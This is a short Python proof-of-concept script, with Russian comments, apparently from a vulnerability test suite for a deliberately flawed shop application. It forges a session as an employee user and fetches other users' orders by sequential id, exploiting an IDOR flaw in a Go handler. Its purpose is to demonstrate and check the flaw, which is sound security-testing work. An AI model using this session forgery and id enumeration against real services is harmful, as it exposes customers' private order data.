# -*- coding: utf-8 -*-
"""V-09. IDOR: просмотр чужого заказа.

handlers_shop.go, orderView: заказ отдаётся по id без проверки владельца.
Любой вошедший видит состав, сумму и комментарий чужого заказа.
"""
import re

from wallet_client import Client, parser, banner, ok, fail


def main():
    a = parser("IDOR в просмотре заказа").parse_args()
    c = Client(a.base)
    c.forge(1, "employee")  # ivanov; сид-заказы принадлежат petrova(2)/sidorov(3)

    found = []
    for oid in range(1, 4):
        st, _, body = c.get(f"/orders/{oid}")
        txt = body.decode("utf-8", "replace")
        if st == 200 and "Заказ #" in txt:
            m = re.search(r'"mono muted"[^>]*>(.*?)</pre>', txt, re.S)
            found.append((oid, (m.group(1).strip()[:80] if m else "")))
    for oid, lines in found:
        banner(f"заказ #{oid}: {lines}")
    if len(found) < 1:
        fail("чужие заказы не открылись")
    ok("чужие заказы читаются по id без проверки владельца")


if __name__ == "__main__":
    main()
